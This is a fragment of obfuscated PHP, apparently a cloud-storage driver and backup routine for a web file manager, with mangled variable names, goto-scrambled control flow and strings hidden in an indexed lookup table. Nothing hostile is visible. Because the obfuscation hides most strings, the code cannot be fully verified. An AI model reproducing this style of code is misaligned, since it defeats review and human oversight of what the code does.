$this->bucketManager->buildBatchDelete($this->bucket, $A»—ÚÖ­µ‡); list($C”Ö½²ÆÔš, $aÅÁÖ¹À÷½) = $this->bucketManager->batch($eÔÅ¤´‰éÉ); return $aÅÁÖ¹À÷½; } private function fileList($f¯ÚÁÑÔî, $c§¬ßøµ¬Ø = 0) { goto b‚Ãº‡œğÖ; Fªá³‡–¬: $c¥²ëØ‘åÌ = $f¨£å»¶®à[33]; $aÖõ¯ŠÑê = 1000; $D½åë·œ¯ˆ = $f¨£å»¶®à[33]; goto dÖÁ„åƒ†ô; dÖÁ„åƒ†ô: $BÊ¾ğ×íŠŒ = array(); while (!0) { list($bÒË÷®»š, $f²ÙÁ×›á) = $this->bucketManager->listFiles($this->bucket, $B‘´ŞÆ¸òï, $c¥²ëØ‘åÌ, $aÖõ¯ŠÑê, $D½åë·œ¯ˆ); if ($f²ÙÁ×›á) { return !1; } $c¥²ëØ‘åÌ = array_key_exists($f¨£å»¶®à[1175], $bÒË÷®»š) ? $c¥²ëØ‘åÌ = $bÒË÷®»š[$f¨£å»¶®à[1208]] : $f¨£å»¶®à[33]; foreach ($bÒË÷®»š[$f¨£å»¶®à[1209]] as $aÉ·Éïê) { $EèšîªŞƒÌ = $aÉ·Éïê[$f¨£å»¶®à[89]]; if ($c§¬ßøµ¬Ø) { $EèšîªŞƒÌ = array($f¨£å»¶®à[28] => $EèšîªŞƒÌ, $f¨£å»¶®à[77] => $aÉ·Éïê[$f¨£å»¶®à[1210]]); } $BÊ¾ğ×íŠŒ[] = $EèšîªŞƒÌ; } if ($c¥²ëØ‘åÌ == $f¨£å»¶®à[33]) { break; } } return $BÊ¾ğ×íŠŒ; goto EšòÃ øÍ; b‚Ãº‡œğÖ: $f¨£å»¶®à =& $_SERVER[Äº¡•ô™Ÿ]; $f¯ÚÁÑÔî = trim($f¯ÚÁÑÔî, $f¨£å»¶®à[8]); $B‘´ŞÆ¸òï = empty($f¯ÚÁÑÔî) ? $f¨£å»¶®à[33] : $f¯ÚÁÑÔî . $f¨£å»¶®à[8]; goto Fªá³‡–¬; EšòÃ øÍ: } public function rename($dèµÃõÁÂÓ, $bË¬šˆçÖ) { return $this->renameObject($dèµÃõÁÂÓ, $bË¬šˆçÖ); } public function fileInfo($B¢í»Á§‹¤, $d°îâó‰‰Ğ = false, $BÑáÒÚòï = array()) { goto cÔÄ¿³÷¨Ù; cÔÄ¿³÷¨Ù: $AÎÃ°ì„„ =& $_SERVER[Äº¡•ô™Ÿ]; if ($d°îâó‰‰Ğ) { return array($AÎÃ°ì„„[28] => $this->pathThis($B¢í»Á§‹¤), $AÎÃ°ì„„[75] => $this->getPathOuter($AÎÃ°ì„„[8] . $B¢í»Á§‹¤), $AÎÃ°ì„„[29] => $AÎÃ°ì„„[164], $AÎÃ°ì„„[77] => isset($BÑáÒÚòï[$AÎÃ°ì„„[1210]]) ? $BÑáÒÚòï[$AÎÃ°ì„„[1210]] : 0, $AÎÃ°ì„„[157] => $this->ext($B¢í»Á§‹¤)); } $FÁî¹¢¼© = array($AÎÃ°ì„„[28] => $this->pathThis($B¢í»Á§‹¤), $AÎÃ°ì„„[75] => $this->getPathOuter($AÎÃ°ì„„[8] . $B¢í»Á§‹¤), $AÎÃ°ì„„[29] => $AÎÃ°ì„„[164], $AÎÃ°ì„„[184] => 0, $AÎÃ°ì„„[107] => 0, $AÎÃ°ì„„[77] => 0, $AÎÃ°ì„„[157] => $this->ext($B¢í»Á§‹¤), $AÎÃ°ì„„[185] => !0, $AÎÃ°ì„„[186] => !0); goto dˆ¡©¼Ê§; dˆ¡©¼Ê§: if (empty($BÑáÒÚòï)) { $BÑáÒÚòï = $this->objectMeta($B¢í»Á§‹¤); if (!$BÑáÒÚòï) { return $FÁî¹¢¼©; } } if (isset($BÑáÒÚòï[$AÎÃ°ì„„[1211]])) { $FÁî¹¢¼©[$AÎÃ°ì„„[184]] = $BÑáÒÚòï[$AÎÃ°ì„„[1211]]; } if (isset($BÑáÒÚòï[$AÎÃ°ì„„[1210]])) { $FÁî¹¢¼©[$AÎÃ°ì„„[77]] = $BÑáÒÚòï[$AÎÃ°ì„„[1210]]; } goto fàç£®„Ë”; fàç£®„Ë”: return $FÁî¹¢¼©; goto C‰Š¢šÓï; C‰Š¢šÓï: } public function folderInfo($A¦çò ßµë, $E¿µµ°ñÅ¾ = false) { goto FŠÖ‰†£Ş; E¸Œ”Úæñ·: $A¦çò ßµë = rtrim($A¦çò ßµë, $eµ—¡ŒŞÌÖ[8]) . $eµ—¡ŒŞÌÖ[8]; $eÃŞê³ˆ„– = $this->objectMeta($A¦çò ßµë); if (isset($eÃŞê³ˆ„–[$eµ—¡ŒŞÌÖ[1211]])) { $eóÒ¿âğò[$eµ—¡ŒŞÌÖ[184]] = $eÃŞê³ˆ„–[$eµ—¡ŒŞÌÖ[1211]]; } goto fàí®ùÅ«; fàí®ùÅ«: return $eóÒ¿âğò; goto EèÏáÔÅ¶‡; FŠÖ‰†£Ş: $eµ—¡ŒŞÌÖ =& $_SERVER[Äº¡•ô™Ÿ]; if ($E¿µµ°ñÅ¾) { return array($eµ—¡ŒŞÌÖ[28] => $this->pathThis($A¦çò ßµë), $eµ—¡ŒŞÌÖ[75] => $this->getPathOuter($eµ—¡ŒŞÌÖ[8] . $A¦çò ßµë), $eµ—¡ŒŞÌÖ[29] => $eµ—¡ŒŞÌÖ[76]); } $eóÒ¿âğò = array($eµ—¡ŒŞÌÖ[28] => $this->pathThis($A¦çò ßµë), $eµ—¡ŒŞÌÖ[75] => $this->getPathOuter($eµ—¡ŒŞÌÖ[8] . $A¦çò ßµë), $eµ—¡ŒŞÌÖ[29] => $eµ—¡ŒŞÌÖ[76], $eµ—¡ŒŞÌÖ[184] => 0, $eµ—¡ŒŞÌÖ[107] => 0, $eµ—¡ŒŞÌÖ[1154] => !0, $eµ—¡ŒŞÌÖ[1155] => !0); goto E¸Œ”Úæñ·; EèÏáÔÅ¶‡: } public function listPath($b¡Û†…²øˆ, $D®¾°»ÊìÙ = false) { goto EÔéôÎÎ‚Â; EÔéôÎÎ‚Â: $Cßâ†Œ¯‘ó =& $_SERVER[Äº¡•ô™Ÿ]; $b¡Û†…²øˆ = trim($b¡Û†…²øˆ, $Cßâ†Œ¯‘ó[8]); $bç‰¤áæ÷ = empty($b¡Û†…²øˆ) ? $Cßâ†Œ¯‘ó[33] : $b¡Û†…²øˆ . $Cßâ†Œ¯‘ó[8]; goto a«‘®¸Û©; f¥…‡ó¯Å: $bÚõÏ‹‰ = $EÁÖëÁ¥à = array(); while (!0) { list($Béš´”„ìÓ, $B—µÛä¢Ú…) = $this->bucketManager->listFiles($this->bucket, $bç‰¤áæ÷, $b‚­îìæ‹¦, $fœ‡Èô¾Ü‡, $AÓ…²æ‰­ï); if ($B—µÛä¢Ú…) { return !1; } $b‚­îìæ‹¦ = array_key_exists($Cßâ†Œ¯‘ó[1175], $Béš´”„ìÓ) ? $b‚­îìæ‹¦ = $Béš´”„ìÓ[$Cßâ†Œ¯‘ó[1208]] : $Cßâ†Œ¯‘ó[33]; if (isset($Béš´”„ìÓ[$Cßâ†Œ¯‘ó[1212]])) { foreach ($Béš´”„ìÓ[$Cßâ†Œ¯‘ó[1212]] as $bŠÁ¡—´Æİ) { if ($bŠÁ¡—´Æİ == $bç‰¤áæ÷) { continue; } $bÚõÏ‹‰[] = $this->folderInfo($bŠÁ¡—´Æİ, $D®¾°»ÊìÙ); } } if (isset($Béš´”„ìÓ[$Cßâ†Œ¯‘ó[1209]])) { foreach ($Béš´”„ìÓ[$Cßâ†Œ¯‘ó[1209]] as $Cè½Íô‰ŸŠ) { if ($Cè½Íô‰ŸŠ[$Cßâ†Œ¯‘ó[89]] == $bç‰¤áæ÷) { continue; } $EÁÖëÁ¥à[] = $this->fileInfo($Cè½Íô‰ŸŠ[$Cßâ†Œ¯‘ó[89]], $D®¾°»ÊìÙ, $Cè½Íô‰ŸŠ); } } if ($b‚­îìæ‹¦ == $Cßâ†Œ¯‘ó[33]) { break; } } return array($Cßâ†Œ¯‘ó[74] => $bÚõÏ‹‰, $Cßâ†Œ¯‘ó[73] => $EÁÖëÁ¥à); goto d¯÷¶à››‹; a«‘®¸Û©: $b‚­îìæ‹¦ = $Cßâ†Œ¯‘ó[33]; $fœ‡Èô¾Ü‡ = 1000; $AÓ…²æ‰­ï = $Cßâ†Œ¯‘ó[8]; goto f¥…‡ó¯Å; d¯÷¶à››‹: } public function has($b„¥ÉŠ¼Ü§, $a‚‹ºĞŸ½Ì = false, $Fâ¥Ÿªé•ò = true) { goto aŠ¾æ‘Óó; aá³êñÅ: $c¹ƒÎÏÂö˜ = 0; $béÉßÌ„¼ğ = 0; while (!0) { list($cö ÙîÑ£¸, $fí†¬åŸã£) = $this->bucketManager->listFiles($this->bucket, $CŒùÂòöÕŞ, $cõÌ¹¡ã, $c…©ÀÔ•”­, $bäùíˆº‡); if ($fí†¬åŸã£) { return !1; } $cõÌ¹¡ã = array_key_exists($CˆŒ¬¹ã­[1175], $cö ÙîÑ£¸) ? $cõÌ¹¡ã = $cö ÙîÑ£¸[$CˆŒ¬¹ã­[1208]] : $CˆŒ¬¹ã­[33]; if ($a‚‹ºĞŸ½Ì) { if (!empty($cö ÙîÑ£¸[$CˆŒ¬¹ã­[1209]])) { $c¹ƒÎÏÂö˜ += count($cö ÙîÑ£¸[$CˆŒ¬¹ã­[1209]]); } if (!empty($cö ÙîÑ£¸[$CˆŒ¬¹ã­[1212]])) { $béÉßÌ„¼ğ += count($cö ÙîÑ£¸[$CˆŒ¬¹ã­[1212]]); } if ($cõÌ¹¡ã === $CˆŒ¬¹ã­[33]) { break; } continue; } if ($Fâ¥Ÿªé•ò) { if (!empty($cö ÙîÑ£¸[$CˆŒ¬¹ã­[1209]])) { return !0; } } else { if (!empty($cö ÙîÑ£¸[$CˆŒ¬¹ã­[1212]])) { return !0; } } if ($cõÌ¹¡ã == $CˆŒ¬¹ã­[33]) { break; } } goto aÎ¬÷µÖøš; Féë¡»ñÛ: $cõÌ¹¡ã = $CˆŒ¬¹ã­[33]; $c…©ÀÔ•”­ = 1000; $bäùíˆº‡ = $CˆŒ¬¹ã­[8]; goto aá³êñÅ; aŠ¾æ‘Óó: $CˆŒ¬¹ã­ =& $_SERVER[Äº¡•ô™Ÿ]; $b„¥ÉŠ¼Ü§ = trim($b„¥ÉŠ¼Ü§, $CˆŒ¬¹ã­[8]); $CŒùÂòöÕŞ = empty($b„¥ÉŠ¼Ü§) ? $CˆŒ¬¹ã­[33] : $b„¥ÉŠ¼Ü§ . $CˆŒ¬¹ã­[8]; goto Féë¡»ñÛ; aÎ¬÷µÖøš: if ($a‚‹ºĞŸ½Ì) { return array($CˆŒ¬¹ã­[188] => $c¹ƒÎÏÂö˜, $CˆŒ¬¹ã­[189] => $béÉßÌ„¼ğ); } return !1; goto fĞ®ºö¢õŞ; fĞ®ºö¢õŞ: } public function listAll($Fò•§›¼Ñ) { $bÏ÷öĞ¡Áµ =& $_SERVER[Äº¡•ô™Ÿ]; $d©Î¤Ÿ·ï» = $this->fileList($Fò•§›¼Ñ, 1); $eÜçŞ’íŞÉ = array(); foreach ($d©Î¤Ÿ·ï» as $F·Õ³‚Û Õ) { $eÜçŞ’íŞÉ[$F·Õ³‚Û Õ[$bÏ÷öĞ¡Áµ[28]]] = $F·Õ³‚Û Õ[$bÏ÷öĞ¡Áµ[77]]; } return $this->listAllFiles($Fò•§›¼Ñ, array_keys($eÜçŞ’íŞÉ), $eÜçŞ’íŞÉ); } public function canRead($eñƒ˜æ) { return $this->exist($eñƒ˜æ) ? !0 : !1; } public function canWrite($Bé†‘Ÿƒí‚) { return $this->exist($Bé†‘Ÿƒí‚) ? !0 : !1; } public function getContent($C¦”¬Øíˆ) { return $this->fileSubstr($C¦”¬Øíˆ, 0, -1); } public function setContent($C‘òÍ¾ùŒ˜, $fº­Ñã‰æ = '') { $FÕÛÕÇÊä = $this->tempFile($this->pathThis($C‘òÍ¾ùŒ˜)); file_put_contents($FÕÛÕÇÊä, $fº­Ñã‰æ); if ($this->upload($C‘òÍ¾ùŒ˜, $FÕÛÕÇÊä)) { $this->tempFileRemve($FÕÛÕÇÊä); return !0; } return !1; } public function refreshUrls($fÚ‚††ë†é) { goto B—ñ«´½¬¶; FïøÀ“ÆêÛ: return $cö†ìÒéÒê[$DÄ“’âÊÅó[1213]] == $DÄ“’âÊÅó[699] ? !0 : !1; goto fŠßÏÕÁ×à; B—ñ«´½¬¶: $DÄ“’âÊÅó =& $_SERVER[Äº¡•ô™Ÿ]; $C³Ú¡Ü‹†  = array(); if (is_array($fÚ‚††ë†é)) { foreach ($fÚ‚††ë†é as $F‹áÔÜ¢çô) { $C³Ú¡Ü‹† [] = $this->link($F‹áÔÜ¢çô); } } else { $C³Ú¡Ü‹† [] = $this->link($fÚ‚††ë†é); } goto cîÄ¢·ŠÚ; cîÄ¢·ŠÚ: $aë„‘ã”ˆÑ = new Qiniu\Cdn\CdnManager($this->auth); list($cö†ìÒéÒê, $BŠî÷çÅŠÔ) = $aë„‘ã”ˆÑ->refreshUrls($C³Ú¡Ü‹† ); if ($BŠî÷çÅŠÔ) { return !1; } goto FïøÀ“ÆêÛ; fŠßÏÕÁ×à: } public function fileSubstr($fÒÍï¦ƒ¯å, $C“æˆù²˜å, $e·ŠŠÓî†İ) { $e‹¡Í®Â¼Ø =& $_SERVER[Äº¡•ô™Ÿ]; if (!($b­áğ÷­Å¢ = $this->link($fÒÍï¦ƒ¯å))) { return !1; } $b»•È‰Ñ²È = !1; if ($e·ŠŠÓî†İ > 0) { $AºÕ™…Ó  = $C“æˆù²˜å + $e·ŠŠÓî†İ - 1; $b»•È‰Ñ²È = array($e‹¡Í®Â¼Ø[1214] . $C“æˆù²˜å . $e‹¡Í®Â¼Ø[408] . $AºÕ™…Ó ); } $Aƒ‰©Òƒ = url_request($b­áğ÷­Å¢, $e‹¡Í®Â¼Ø[213], !1, $b»•È‰Ñ²È); return $Aƒ‰©Òƒ[$e‹¡Í®Â¼Ø[692]] ? $Aƒ‰©Òƒ[$e‹¡Í®Â¼Ø[1034]] : !1; } public function upload($C•ÑÓ»£…Ì, $C‰­ƒ¾Òâ©, $bº¼º¢ó”Ç = false, $f“ª¹¥•í = REPEAT_REPLACE) { $eæ¨íŠĞ¸× = new Qiniu\Storage\UploadManager(); $CÓŒæèŒŞö = $this->auth->uploadToken($this->bucket, $C•ÑÓ»£…Ì); $F‘¢ÚØ¾‹ = get_file_mime(get_path_ext($C‰­ƒ¾Òâ©)); list($b’ñˆ£¶ƒ, $FÁç­§Úà×) = $eæ¨íŠĞ¸×->putFile($CÓŒæèŒŞö, $C•ÑÓ»£…Ì, $C‰­ƒ¾Òâ©, null, $F‘¢ÚØ¾‹); return $FÁç­§Úà× ? !1 : $this->getPathOuter($C•ÑÓ»£…Ì); } public function uploadFormData($CÄøğ¹À‰„, $f ÃàĞ–¥Œ = 3600) { return $this->uploadToken($CÄøğ¹À‰„, $f ÃàĞ–¥Œ); } public function multiUploadFormData($fĞØĞ¸ƒˆ¹, $F¦»¤‹Ş = 3600) { return $this->uploadToken($fĞØĞ¸ƒˆ¹, $F¦»¤‹Ş); } private function uploadToken($dÀ®®×ËŠ, $eàİÙ›Î = 3600) { goto d®•±™õÆİ; d®•±™õÆİ: $b¬„¸Æ¾Î¥ =& $_SERVER[Äº¡•ô™Ÿ]; $BÀÓ¼¦âÒâ = $eàİÙ›Î; $B¥‹ñù¹¾ = array($b¬„¸Æ¾Î¥[1215] => $b¬„¸Æ¾Î¥[1216]); goto BëñóÙÕ«Ù; BëñóÙÕ«Ù: $c¨¿Ú­½¥ê = null; $aÀÓÆ‚ãèº = $this->auth->uploadToken($this->bucket, $c¨¿Ú­½¥ê, $BÀÓ¼¦âÒâ, $B¥‹ñù¹¾, !0); $aŒ´·½ğ¾¿ = empty($this->region) || $this->region == $b¬„¸Æ¾Î¥[1217] ? $b¬„¸Æ¾Î¥[33] : $b¬„¸Æ¾Î¥[408] . $this->region; goto AÂÁÙ õ ‡; AÂÁÙ õ ‡: $eè•‚ìòƒ— = http_type() . "\x3a\x2f\x2f\165\x70\x6c\157\x61\x64{$aŒ´·½ğ¾¿}\56\x71\x69\x6e\x69\165\160\56\143\x6f\x6d\57"; return array($b¬„¸Æ¾Î¥[1218] => $aÀÓÆ‚ãèº, $b¬„¸Æ¾Î¥[1219] => $eè•‚ìòƒ—); goto b„ÕŠ­˜»; b„ÕŠ­˜»: } public function download($EË®ÒÓÚ¹», $fæˆï¿ÙÔ) { goto bôÆË¡‘‰µ; bôÆË¡‘‰µ: $C’êÜËÛ = IO::getPathInner(IO::mkfile($fæˆï¿ÙÔ)); if (!($eÚËİ¶à„ = $this->link($EË®ÒÓÚ¹»))) { return !1; } $B£Šù…ª˜ = 0; goto a¨Â‹³Š°Õ; dÚ³——Î×: fclose($f§‰Š§—‘); return $fæˆï¿ÙÔ; goto e’Í·…—Ëª; a¨Â‹³Š°Õ: $AØù‰­ÙÒğ = 1024 * 200; $f§‰Š§—‘ = fopen($C’êÜËÛ, $_SERVER[Äº¡•ô™Ÿ][1220]); while (!0) { $Eİ¯ˆÓ©º = $this->fileSubstr($EË®ÒÓÚ¹», $B£Šù…ª˜, $AØù‰­ÙÒğ); if ($Eİ¯ˆÓ©º === !1) { return !1; } fwrite($f§‰Š§—‘, $Eİ¯ˆÓ©º); $B£Šù…ª˜ += $AØù‰­ÙÒğ; if (strlen($Eİ¯ˆÓ©º) < $AØù‰­ÙÒğ) { break; } } goto dÚ³——Î×; e’Í·…—Ëª: } public function link($a× ³†Ïáï, $AêøÆ‰— Û = '') { if (!$this->isFile($a× ³†Ïáï)) { return !1; } $b…•™ ñô¥ = $this->getHost() . $_SERVER[Äº¡•ô™Ÿ][8] . $this->pathEncode($a× ³†Ïáï) . $AêøÆ‰— Û; return $this->auth->privateDownloadUrl($b…•™ ñô¥, 3600 * 12); } public function fileOut($A¼©Ÿ­•ù³, $f™ÔçÆ‘ = false, $fÈ¯º­óÅ‹ = false, $d¼¨¢´•»Æ = '') { $Bªİ»æ£Ó¥ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$fÈ¯º­óÅ‹) { $fÈ¯º­óÅ‹ = $this->pathThis($A¼©Ÿ­•ù³); } $FÅèø•ºš¼ = $f™ÔçÆ‘ ? $Bªİ»æ£Ó¥[1221] . rawurlencode($fÈ¯º­óÅ‹) : $Bªİ»æ£Ó¥[33]; $F—¢Ş°‰œõ = $this->link($A¼©Ÿ­•ù³, $FÅèø•ºš¼); $this->fileOutLink($F—¢Ş°‰œõ); } public function fileOutServer($EÀôÇÔÈŠŒ, $bÍç¶Ø­åë = false, $c±–Ğê“Ãã = false, $açÖ‚ Çó = '') { parent::fileOut($EÀôÇÔÈŠŒ, $bÍç¶Ø­åë, $c±–Ğê“Ãã, $açÖ‚ Çó); } public function fileOutImage($dª¦îÏ¹ÍÆ, $Bíå÷˜…ÂÏ = 250) { $eªšÈ©ÇğÎ = $this->link($dª¦îÏ¹ÍÆ, $_SERVER[Äº¡•ô™Ÿ][1222] . $Bíå÷˜…ÂÏ); $this->fileOutLink($eªšÈ©ÇğÎ); } public function fileOutImageServer($Aõô†˜œŒï, $B£Ô³Ğè¬ = 250) { parent::fileOutImage($Aõô†˜œŒï, $B£Ô³Ğè¬); } public function hashMd5($f‘ß«°‚®Ö) { $F‡ÌµÅ¥ÙÈ =& $_SERVER[Äº¡•ô™Ÿ]; $d²öÁ•”©æ = $this->objectMeta($f‘ß«°‚®Ö); return isset($d²öÁ•”©æ[$F‡ÌµÅ¥ÙÈ[193]]) ? $d²öÁ•”©æ[$F‡ÌµÅ¥ÙÈ[193]] : !1; $E¢»§ì¥™— = $this->link($f‘ß«°‚®Ö, $F‡ÌµÅ¥ÙÈ[1223]); } public function size($cÎŞ£´ª­á) { $D˜ëÜô¢Üø = $this->objectMeta($cÎŞ£´ª­á); return $D˜ëÜô¢Üø ? $D˜ëÜô¢Üø[$_SERVER[Äº¡•ô™Ÿ][77]] : 0; } public function info($B½¹–Ê·Î) { if ($this->isFolder($B½¹–Ê·Î)) { return $this->folderInfo($B½¹–Ê·Î); } else { if ($this->isFile($B½¹–Ê·Î)) { return $this->fileInfo($B½¹–Ê·Î); } } return !1; } public function exist($E‡†øË±ö) { return $this->isFile($E‡†øË±ö) || $this->isFolder($E‡†øË±ö); } public function isFile($E¥Ïˆß¹®) { return !$this->isFolder($E¥Ïˆß¹®) && $this->objectMeta($E¥Ïˆß¹®); } public function isFolder($a‚‹à³š‰) { return $this->cacheMethod($_SERVER[Äº¡•ô™Ÿ][220], $a‚‹à³š‰); } protected function objectMeta($E´ªŠß£àø) { return $this->cacheMethod($_SERVER[Äº¡•ô™Ÿ][221], $E´ªŠß£àø); } protected function _objectMeta($Cî“¡¦Ğ˜Œ) { $B¤»ÉÃĞ­ =& $_SERVER[Äº¡•ô™Ÿ]; list($bˆá‚ÏŸ±Ï, $dŞ É˜¥Ã–) = $this->bucketManager->stat($this->bucket, $Cî“¡¦Ğ˜Œ); if ($bˆá‚ÏŸ±Ï) { $bˆá‚ÏŸ±Ï[$B¤»ÉÃĞ­[77]] = intval($bˆá‚ÏŸ±Ï[$B¤»ÉÃĞ­[1210]]); } return $bˆá‚ÏŸ±Ï; } protected function _isFolder($b¶ƒï¡«´‡) { $A‹¥–»œê‘ =& $_SERVER[Äº¡•ô™Ÿ]; list($A¹„áæ‘±¬, $Cò¯«Î¾”) = $this->bucketManager->listFiles($this->bucket, trim($b¶ƒï¡«´‡, $A‹¥–»œê‘[8]) . $A‹¥–»œê‘[8], $A‹¥–»œê‘[33], 1, $A‹¥–»œê‘[8]); return !empty($A¹„áæ‘±¬[$A‹¥–»œê‘[1209]]) || !empty($A¹„áæ‘±¬[$A‹¥–»œê‘[1212]]) ? !0 : !1; } } goto aÖ§¹Ó”áè; f³Íñğ«¿: class BackupFile { public function __construct() { } public function index() { goto eæ‹è¾ èÚ; c˜Åóà·Òº: $e²êÁ“™Á = 1000; $b¦‰¦ŞÅëÚ = $A¥´‡áë‡ó = 0; $c‰™Šöµ¯ = array(); goto c“ÆÁì¬Ëå; C¨†ğï¼: $D¦øŠĞ¦¦Ä->task[$_SERVER[Äº¡•ô™Ÿ][701]] = $C©–µ´Ğ˜; $Bï‡œÉ‚Ù = array($_SERVER[Äº¡•ô™Ÿ][741] => $c¯ìÙª‰È§, $_SERVER[Äº¡•ô™Ÿ][742] => $C©–µ´Ğ˜); Backup::set($Bï‡œÉ‚Ù); goto c¶Èñ§‚÷—; c¶Èñ§‚÷—: $BÕ¢Š÷‡ÜÆ = !0; $e¿­‚áÃÔŸ = $this->storeIds(); $eÖÄÉ¦Óôë = 1; goto c˜Åóà·Òº; bÊ²«ÌâÃ: Backup::set($Bï‡œÉ‚Ù); $this->_fileFilter($c‰™Šöµ¯); return !0; goto Bƒ¨ó¢ùÊ¿; EÕÊºˆê®Ö: $c¯ìÙª‰È§ = (int) Model($_SERVER[Äº¡•ô™Ÿ][722])->where($FÇµì‰š©”)->count($_SERVER[Äº¡•ô™Ÿ][415]); $C©–µ´Ğ˜ = (int) Model($_SERVER[Äº¡•ô™Ÿ][722])->where($FÇµì‰š©”)->sum($_SERVER[Äº¡•ô™Ÿ][77]); $D¦øŠĞ¦¦Ä = new TaskFileTransfer($_SERVER[Äº¡•ô™Ÿ][739], $_SERVER[Äº¡•ô™Ÿ][715], $c¯ìÙª‰È§, LNG($_SERVER[Äº¡•ô™Ÿ][716]) . $_SERVER[Äº¡•ô™Ÿ][717] . LNG($_SERVER[Äº¡•ô™Ÿ][740])); goto C¨†ğï¼; DŠ¬İŒÑŞ: $fæöğÒ±Ç = $BÕ¢Š÷‡ÜÆ ? 1 : 0; $Bï‡œÉ‚Ù = array($_SERVER[Äº¡•ô™Ÿ][753] => 1, $_SERVER[Äº¡•ô™Ÿ][706] => time(), $_SERVER[Äº¡•ô™Ÿ][712] => $fæöğÒ±Ç, $_SERVER[Äº¡•ô™Ÿ][750] => $fğªí¤ìáÈ, $_SERVER[Äº¡•ô™Ÿ][742] => $C©–µ´Ğ˜, $_SERVER[Äº¡•ô™Ÿ][741] => $c¯ìÙª‰È§); if ($A¥´‡áë‡ó) { $Bï‡œÉ‚Ù[$_SERVER[Äº¡•ô™Ÿ][751]] = $Dì¦ÇÙ×; $Bï‡œÉ‚Ù[$_SERVER[Äº¡•ô™Ÿ][752]] = $bøÉİòÍŒ‡; } goto bÊ²«ÌâÃ; c“ÆÁì¬Ëå: $bøÉİòÍŒ‡ = $Dì¦ÇÙ× = 0; do { $Cšªƒ‚…Ä´ = $_SERVER[Äº¡•ô™Ÿ][743]; $cÕ˜Ù‡â = Model($_SERVER[Äº¡•ô™Ÿ][722])->where($FÇµì‰š©”)->field($Cšªƒ‚…Ä´)->order($_SERVER[Äº¡•ô™Ÿ][744])->selectPage($e²êÁ“™Á, $eÖÄÉ¦Óôë); $cáÌØÑì‰ç = !empty($cÕ˜Ù‡â[$_SERVER[Äº¡•ô™Ÿ][351]]) ? $cÕ˜Ù‡â[$_SERVER[Äº¡•ô™Ÿ][351]] : array(); foreach ($cáÌØÑì‰ç as $f‡—ÅÕØ‹ó) { goto BÄëÂ°”‘¿; BÄëÂ°”‘¿: if (!$this->_fileExist($f‡—ÅÕØ‹ó, $c‰™Šöµ¯, $e¿­‚áÃÔŸ)) { $c¯ìÙª‰È§ -= 1; $C©–µ´Ğ˜ -= (int) $f‡—ÅÕØ‹ó[$_SERVER[Äº¡•ô™Ÿ][77]]; write_log("\x66\151\x6c\145\40\156\157\164\40\x65\170\151\x73\x74\x2e\146\151\154\x65\x49\x44\72{$f‡—ÅÕØ‹ó[$_SERVER[Äº¡•ô™Ÿ][415]]}\x2c\x20\x70\x61\164\x68\72{$f‡—ÅÕØ‹ó[$_SERVER[Äº¡•ô™Ÿ][75]]}", $_SERVER[Äº¡•ô™Ÿ][745]); continue; } $Aªù ÍãÜ = $f‡—ÅÕØ‹ó[$_SERVER[Äº¡•ô™Ÿ][75]]; $cŒ›—ˆˆÛñ = "\173\151\x6f\x3a{$D„«Á¼ÎÄ³[$_SERVER[Äº¡•ô™Ÿ][694]]}\175" . substr($Aªù ÍãÜ, strlen("\x7b\151\x6f\x3a{$f‡—ÅÕØ‹ó[$_SERVER[Äº¡•ô™Ÿ][746]]}\x7d")); goto BÇğ­¢š‰Ï; BÇğ­¢š‰Ï: if (IO::exist($cŒ›—ˆˆÛñ)) { $D¦øŠĞ¦¦Ä->updateFileEnd($f‡—ÅÕØ‹ó[$_SERVER[Äº¡•ô™Ÿ][28]], $f‡—ÅÕØ‹ó[$_SERVER[Äº¡•ô™Ÿ][77]]); } else { $cŒ›—ˆˆÛñ = get_path_father($cŒ›—ˆˆÛñ); IO::mkdir($cŒ›—ˆˆÛñ); if (!IO::copy($Aªù ÍãÜ, $cŒ›—ˆˆÛñ, $_SERVER[Äº¡•ô™Ÿ][747])) { write_log($_SERVER[Äº¡•ô™Ÿ][748] . $Aªù ÍãÜ . $_SERVER[Äº¡•ô™Ÿ][749] . $cŒ›—ˆˆÛñ . $_SERVER[Äº¡•ô™Ÿ][472], $_SERVER[Äº¡•ô™Ÿ][715]); $BÕ¢Š÷‡ÜÆ = !1; break; } } $fğªí¤ìáÈ = $f‡—ÅÕØ‹ó[$_SERVER[Äº¡•ô™Ÿ][415]]; $A¥´‡áë‡ó += 1; goto e³ôŸ”÷ôï; e³ôŸ”÷ôï: $b¦‰¦ŞÅëÚ += $f‡—ÅÕØ‹ó[$_SERVER[Äº¡•ô™Ÿ][77]]; $Dì¦ÇÙ× += 1; $bøÉİòÍŒ‡ += $f‡—ÅÕØ‹ó[$_SERVER[Äº¡•ô™Ÿ][77]]; goto bÃ¥éô ÄÏ; bÃ¥éô ÄÏ: if ($b¦‰¦ŞÅëÚ >= 1024 * 1024 * 100) { $Bï‡œÉ‚Ù = array($_SERVER[Äº¡•ô™Ÿ][750] => $fğªí¤ìáÈ, $_SERVER[Äº¡•ô™Ÿ][751] => $Dì¦ÇÙ×, $_SERVER[Äº¡•ô™Ÿ][752] => $bøÉİòÍŒ‡); Backup::set($Bï‡œÉ‚Ù); $b¦‰¦ŞÅëÚ = $A¥´‡áë‡ó = 0; } goto eÇ…Œè‰ÁÖ; eÇ…Œè‰ÁÖ: } $cõæÊĞœ = count($cáÌØÑì‰ç); $eÖÄÉ¦Óôë++; } while ($cõæÊĞœ == $e²êÁ“™Á); $D¦øŠĞ¦¦Ä->end(); goto DŠ¬İŒÑŞ; eæ‹è¾ èÚ: $D„«Á¼ÎÄ³ = Backup::get(); $fğªí¤ìáÈ = $D„«Á¼ÎÄ³[$_SERVER[Äº¡•ô™Ÿ][278]][$_SERVER[Äº¡•ô™Ÿ][164]][$_SERVER[Äº¡•ô™Ÿ][415]]; $FÇµì‰š©” = array($_SERVER[Äº¡•ô™Ÿ][416] => array($_SERVER[Äº¡•ô™Ÿ][737], $fğªí¤ìáÈ), $_SERVER[Äº¡•ô™Ÿ][738] => array($_SERVER[Äº¡•ô™Ÿ][316], $D„«Á¼ÎÄ³[$_SERVER[Äº¡•ô™Ÿ][694]])); goto EÕÊºˆê®Ö; Bƒ¨ó¢ùÊ¿: } private function _fileExist($BµôĞ’ï, &$A¬±ÑÎô±, $eË„¯ßŞ‹) { goto F‰¿•‚ºŒŒ; BËäó¢·Á : $A¬±ÑÎô± = array_merge($A¬±ÑÎô±, array_to_keyvalue($bÀò¸øˆà±, $a¨®‡´ªÓÚ[33], $a¨®‡´ªÓÚ[415])); return !1; goto BÒ¡¼Ò•ÕÃ; F‰¿•‚ºŒŒ: 